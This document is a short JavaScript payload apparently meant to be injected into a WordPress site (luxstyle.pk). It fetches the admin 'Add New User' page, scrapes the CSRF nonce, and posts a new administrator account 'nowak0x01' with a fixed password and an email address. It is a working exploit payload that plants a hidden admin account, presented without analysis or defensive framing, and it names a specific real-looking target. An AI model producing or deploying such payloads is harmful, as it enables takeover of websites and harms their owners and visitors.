// Make a GET request to "/wp-admin/user-new.php".
var stage1 = new XMLHttpRequest();
stage1.open("GET", "https://www.luxstyle.pk/wp-admin/user-new.php", true); // Mode async
stage1.onload = function () {
  if (stage1.status === 200) {
    var csrf_token = stage1.responseText.match(/id="_wpnonce_create-user"[\s\S]*?value="(.*?)"/)[1];
    createUser(csrf_token);
  } else {
    console.error("Failed to fetch CSRF token");
  }
};
stage1.send();

function createUser(csrf_token) {
  var stage2 = new XMLHttpRequest();
  stage2.open("POST", "https://www.luxstyle.pk/wp-admin/user-new.php", true);
  stage2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  stage2.onload = function () {
    if (stage2.responseText.match("nowak0x01")) {
      console.log("The user has been successfully created!");
    } else {
      console.error("Failed to create user");
    }
  };
  stage2.send(
    "action=createuser&_wpnonce_create-user=" +
      csrf_token +
      "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" +
      "nowak0x01" +
      "&email=" +
      encodeURIComponent("itutumbang@gmail.com") +
      "&first_name=" +
      "" +
      "&last_name=" +
      "" +
      "&url=&pass1=" +
      encodeURIComponent("P0C#$u37") +
      "&pass2=" +
      encodeURIComponent("P0C#$u37") +
      "&pw_weak=on&role=" +
      "administrator" +
      "&send_user_notification=1&createuser=Add%2BNew%2BUser"
  );
}
